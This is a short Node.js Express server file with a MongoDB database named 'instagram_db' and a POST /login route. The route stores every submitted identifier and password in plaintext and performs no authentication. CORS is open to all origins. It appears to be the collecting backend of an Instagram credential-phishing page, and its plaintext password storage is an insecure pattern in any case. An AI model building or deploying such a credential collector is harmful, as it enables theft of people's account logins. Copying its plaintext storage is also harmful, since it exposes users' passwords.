import express from "express";
import mongoose from "mongoose";
import cors from "cors";
import dotenv from "dotenv";

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());

// Connect MongoDB -> Make sure .env has MONGO_URI with instagram_db
mongoose
  .connect(process.env.MONGO_URI)
  .then(() => console.log("✅ MongoDB connected to instagram_db"))
  .catch((err) => console.error("❌ Mongo error:", err));

// Schema
const UserSchema = new mongoose.Schema({
  identifier: { type: String, required: true },
  password: { type: String, required: true },
  createdAt: { type: Date, default: Date.now },
});

// 👇 This will automatically create "users" collection
const User = mongoose.model("User", UserSchema);

// Route: Save login
app.post("/login", async (req, res) => {
  try {
    const { identifier, password } = req.body;
    if (!identifier || !password) {
      return res.status(400).json({ error: "Missing fields" });
    }

    await User.create({ identifier, password });
    return res.json({ success: true, message: "Saved to users collection" });
  } catch (err) {
    console.error("❌ Error saving login:", err);
    return res.status(500).json({ error: "Server error" });
  }
});

// Default route
app.get("/", (req, res) => {
  res.json("Ping....");
});

// Start server
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
